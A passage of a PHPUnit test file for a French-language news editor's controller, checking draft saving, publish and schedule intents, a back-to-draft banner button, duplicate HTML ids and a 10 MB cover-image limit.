            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => $intent,
        ];
    }

    /** A field list the server refuses (issue #1120): a label carrying markup. */
    private function refusedFieldJson(): string
    {
        return (string) json_encode([
            ['field_type' => 'number', 'label' => 'Repas <b>x</b>', 'price_per_unit' => 8],
        ]);
    }

    /** The editor of an article never saved: save the draft, nothing to publish yet. */
    public function testTheCreationPageOffersNoPublishNorScheduleBeforeTheFirstSave(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $body = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), [])->getBody();

        $this->assertStringContainsString('Enregistrer le brouillon', $body);
        $this->assertStringContainsString('Enregistrez le brouillon pour pouvoir publier', $body);
        $this->assertStringNotContainsString('value="publish"', $body);
        $this->assertStringNotContainsString('Programmer…', $body);
        $this->assertStringNotContainsString('news-schedule-submit', $body);
        $this->assertStringNotContainsString('id="news-publish-btn"', $body);
    }

    /** A creation refused by validation is still an article never saved: same page, same absence. */
    public function testTheCreationPageAfterARefusedSaveStillOffersNoPublish(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('save', [
            'fields_json' => $this->refusedFieldJson(),
        ]), [], []), []);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame([], $this->articleRepository->findAll());
        $this->assertStringContainsString('Enregistrez le brouillon pour pouvoir publier', $response->getBody());
        $this->assertStringNotContainsString('value="publish"', $response->getBody());
        $this->assertStringNotContainsString('Programmer…', $response->getBody());
    }

    /** « Enregistrer » still creates the draft and sends nothing, as before. */
    public function testASaveAtCreationMakesADraftAndSaysNothingMore(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('save'), [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertSame(Article::STATE_DRAFT, $this->articleService->state($article));
        $this->assertNull(\Core\Http\FlashMessage::get());
    }

    /**
     * A request that asks to publish at creation — without JavaScript, or
     * forged — saves the draft and says to publish afterwards: nothing goes
     * online, no notice is armed, no « publié » in the journal.
     */
    public function testAPublishIntentAtCreationSavesADraftAndSaysSaveFirst(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $events = $this->recordJournal();
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('publish'), [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertSame(Article::STATE_DRAFT, $this->articleService->state($article));
        $this->assertFalse($this->articleService->isLive($article));
        $this->assertSame(['article_created'], $events->getArrayCopy());
        $this->assertSame(
            ['type' => 'warning', 'message' => 'Enregistrez d\'abord, puis publiez.'],
            \Core\Http\FlashMessage::get()
        );
    }

    public function testAScheduleIntentAtCreationSavesADraftWithNothingScheduled(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $events = $this->recordJournal();
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('schedule', [
            'schedule_date' => '2999-10-20',
            'schedule_time' => '08:00',
        ]), [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertSame(Article::STATE_DRAFT, $this->articleService->state($article));
        $this->assertNull($article->publishedAt);
        $this->assertNull($this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $article->id));
        $this->assertSame(['article_created'], $events->getArrayCopy());
        $this->assertSame('Enregistrez d\'abord, puis publiez.', \Core\Http\FlashMessage::get()['message'] ?? null);
    }

    /** The time asked for is not even judged: the article is not being scheduled, only saved. */
    public function testAScheduleIntentAtCreationWithAPastTimeStillSavesTheDraft(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('schedule', [
            'schedule_date' => '2000-01-01',
            'schedule_time' => '08:00',
        ]), [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $this->assertCount(1, $this->articleRepository->findAll());
    }

    /** A premature intent does not get a refused creation through: nothing is written, nothing sent. */
    public function testAPrematureIntentWithARefusedSaveWritesNothing(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $events = $this->recordJournal();
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('publish', [
            'fields_json' => $this->refusedFieldJson(),
        ]), [], []), []);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame([], $this->articleRepository->findAll());
        $this->assertSame([], $events->getArrayCopy());
        $this->assertNull(\Core\Http\FlashMessage::get());
    }

    /** What stays: a saved draft publishes and schedules through update(), as ever. */
    public function testASavedDraftStillOffersPublishAndSchedule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);

        $body = $this->newsController->edit(
            new Request('GET', '/news/' . $id . '/gerer', [], [], [], []),
            ['id' => (string) $id]
        )->getBody();

        $this->assertStringContainsString('value="publish"', $body);
        $this->assertStringContainsString('Programmer…', $body);
        $this->assertStringNotContainsString('Enregistrez le brouillon pour pouvoir publier', $body);
    }

    // ── « Repasser en brouillon » in the banner of a scheduled article (#1357) ──

    /** @return string the editor of an article scheduled for later */
    private function scheduledEditor(): string
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $this->articleService->schedule($id, new \DateTimeImmutable('2999-10-20 08:00'));

        return $this->newsController->edit(
            new Request('GET', '/news/' . $id . '/gerer', [], [], [], []),
            ['id' => (string) $id]
        )->getBody();
    }

    public function testTheScheduledBannerOffersBackToDraftBesideTheOtherTwoActions(): void
    {
        $body = $this->scheduledEditor();

        $banner = (string) substr($body, (int) strpos($body, 'data-news-scheduled'), 3500);
        $this->assertStringContainsString('Modifier l\'heure', $banner);
        $this->assertStringContainsString('Publier maintenant', $banner);
        $this->assertMatchesRegularExpression(
            '#<button type="submit" form="news-editor-form"[^>]*name="intent" value="unpublish"[^>]*>Repasser en brouillon</button>#s',
            $banner
        );
        // Under « Modifier l'heure », in the order of the page.
        $this->assertLessThan(
            (int) strpos($banner, 'Repasser en brouillon'),
            (int) strpos($banner, 'Modifier l\'heure')
        );
    }

    /** The bottom one stays where it was: two buttons, one action. */
    public function testTheBackToDraftButtonAtTheBottomStaysAndBothDoTheSame(): void
    {
        $body = $this->scheduledEditor();

        $this->assertSame(2, substr_count($body, 'value="unpublish"'));
        preg_match_all('#<button[^>]*value="unpublish"[^>]*>#s', $body, $matches);
        $this->assertCount(2, $matches[0]);
        foreach (['data-confirm', 'data-confirm-title', 'data-confirm-label'] as $attribute) {
            $values = array_map(
                static fn(string $tag): string => preg_match('#\s' . preg_quote($attribute, '#') . '="([^"]*)"#', $tag, $m) === 1 ? $m[1] : '',
                $matches[0]
            );
            $this->assertNotSame('', $values[0], $attribute . ' missing on a button');
            $this->assertSame($values[0], $values[1], 'both buttons ask the same confirmation: ' . $attribute);
        }
        $this->assertStringContainsString('Repasser en brouillon ?', $matches[0][0]);
    }

    /**
     * What Enter in the title presses is the first submit button of the
     * form IN DOCUMENT ORDER, the ones attached with form="…" included: it
     * must be a plain save, never one of the banner's actions (#1357).
     */
    public function testEnterInTheTitleSavesWhateverTheBannerOffers(): void
    {
        $body = $this->scheduledEditor();

        preg_match_all('#<button\s[^>]*type="submit"[^>]*>#s', $body, $matches, PREG_OFFSET_CAPTURE);
        $formStart = (int) strpos($body, 'id="news-editor-form"');
        $formEnd = (int) strpos($body, '</form>', $formStart);
        $first = null;
        foreach ($matches[0] as [$tag, $offset]) {
            $inside = $offset > $formStart && $offset < $formEnd;
            if ($inside || str_contains($tag, 'form="news-editor-form"')) {
                $first = $tag;
                break;
            }
        }

        $this->assertNotNull($first);
        $this->assertStringContainsString('value="save"', (string) $first);
    }

    public function testNoHtmlIdIsRepeatedInTheScheduledEditor(): void
    {
        $body = $this->scheduledEditor();

        preg_match_all('#\sid="([^"]+)"#', $body, $matches);
        $repeated = array_keys(array_filter(array_count_values($matches[1]), static fn(int $n): bool => $n > 1));
        $this->assertSame([], $repeated, 'duplicated ids: ' . implode(', ', $repeated));
    }

    public function testTheBannerBackToDraftHasNoIdOfItsOwnThatCollides(): void
    {
        $body = $this->scheduledEditor();

        $this->assertSame(1, substr_count($body, 'id="news-publish-btn"'));
    }

    /** « Repasser en brouillon » from the banner: the same update(), the same result. */
    public function testBackToDraftFromAScheduledArticleWithdrawsItsNotice(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $this->postSchedule($id, '2999-10-20', '08:00');
        $this->assertNotNull($this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $id));

        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => 'unpublish',
        ], [], []), ['id' => (string) $id]);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findById($id);
        $this->assertSame(Article::STATE_DRAFT, $this->articleService->state($article));
        $this->assertNull($this->schedulerService->find('news', 'publish_scheduled_articles', 'article-' . $id));
    }

    // ── The cover image: a limit the server states and the page repeats (#1357) ──

    public function testTheServerLimitForAnImageIsTenMegabytes(): void
    {
        $limit = (new \ReflectionClass(NewsController::class))->getReflectionConstant('IMAGE_MAX_SIZE_BYTES');

        $this->assertSame(10 * 1024 * 1024, $limit?->getValue());
    }

    public function testTheEditorTellsTheBrowserTheLimitAndTheHelpSaysIt(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $body = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), [])->getBody();

        $this->assertStringContainsString('data-max-bytes="10485760"', $body);
        $this->assertStringContainsString('10 Mo au plus', $body);
        $this->assertStringContainsString('id="news-image-error"', $body);
    }

    /** A file the page would have refused is refused anyway: the POST is the net. */
    public function testThePostStillRefusesAFileOverTheLimitWithoutAnyScript(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $oversized = $this->fakeUploadedImage();
        $oversized['size'] = 10 * 1024 * 1024 + 1;
        $_FILES['image'] = $oversized;

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('save'), [], []), []);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertSame([], $this->articleRepository->findAll());
        $this->assertStringContainsString('10 Mo', $response->getBody());
    }

    /** The old 5 Mo is no longer the ceiling: what the browser now produces is admitted. */
    public function testAFileBetweenFiveAndTenMegabytesIsAccepted(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $large = $this->fakeUploadedImage();
        $large['size'] = 6 * 1024 * 1024;
        $_FILES['image'] = $large;

        $response = $this->newsController->store(new Request('POST', '/news', [], $this->creationBody('save'), [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $this->assertCount(1, $this->articleRepository->findAll());
    }

    /**
     * A draft never online offers « Programmer… »; a scheduled article
     * says when, with « Modifier l'heure » and « Publier maintenant »; a
     * draft that has been online is published again, never scheduled.
     */
    public function testTheEditorOffersSchedulingWhereItApplies(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $request = new Request('GET', '/news/' . $id . '/gerer', [], [], [], []);

        $draft = $this->newsController->edit($request, ['id' => (string) $id])->getBody();
        $this->assertStringContainsString('Programmer…', $draft);
        $this->assertStringContainsString('id="news-schedule-submit"', $draft);

        $this->articleService->schedule($id, new \DateTimeImmutable('2999-10-20 08:00'));
        $scheduled = $this->newsController->edit($request, ['id' => (string) $id])->getBody();
        $this->assertStringContainsString('Programmée pour le dimanche 20 octobre 2999 à 8 h 00', $scheduled);
        $this->assertStringContainsString('Pour les membres connectés. Elle apparaîtra d\'elle-même ; vous serez prévenu.', $scheduled);
        $this->assertStringContainsString('Modifier l\'heure', $scheduled);
        $this->assertStringContainsString('Publier maintenant', $scheduled);
        $this->assertStringContainsString('value="2999-10-20"', $scheduled);

        $this->articleService->publish($id);
        $this->articleService->unpublish($id);
        $again = $this->newsController->edit($request, ['id' => (string) $id])->getBody();
        $this->assertStringNotContainsString('Programmer…', $again);
        $this->assertStringNotContainsString('id="news-schedule-submit"', $again);
    }

    /**
     * The time can pass between the check made before the save and
     * schedule()'s own, after it. The article is saved by then: the
     * refusal is a message on its management page, never an error page
     * that would send the author back to create it twice.
     */
    public function testAScheduleRefusedAfterTheSaveIsAMessageNotAnError(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $article = $this->articleRepository->findById($id);
        $this->assertNotNull($article);

        $afterSave = new \ReflectionMethod($this->newsController, 'applyIntentAfterSave');
        $afterSave->invoke($this->newsController, $article, 'schedule', $this->chiefAccountId, new \DateTimeImmutable('-1 minute'));

        $this->assertSame(
            ['type' => 'error', 'message' => 'Cette heure est déjà passée : choisissez un moment à venir.'],
            \Core\Http\FlashMessage::get()
        );
        $this->assertSame(Article::STATUS_DRAFT, $this->articleRepository->findById($id)?->status);
    }

    private function postSchedule(int $id, string $date, string $time, string $title = 'Camp'): \Core\Http\Response
    {
        $_FILES['image'] = $this->fakeUploadedImage();

        return $this->newsController->update(new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'title' => $title,
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'intent' => 'schedule',
            'schedule_date' => $date,
            'schedule_time' => $time,
        ], [], []), ['id' => (string) $id]);
    }

    /** @return \ArrayObject<int, string> the journal's event names, in order */
    private function recordJournal(): \ArrayObject
    {
        $events = new \ArrayObject();
        $this->journalService->method('log')->willReturnCallback(
            function (string $module, string $event) use ($events): void {
                $events->append($event);
            }
        );

        return $events;
    }
}
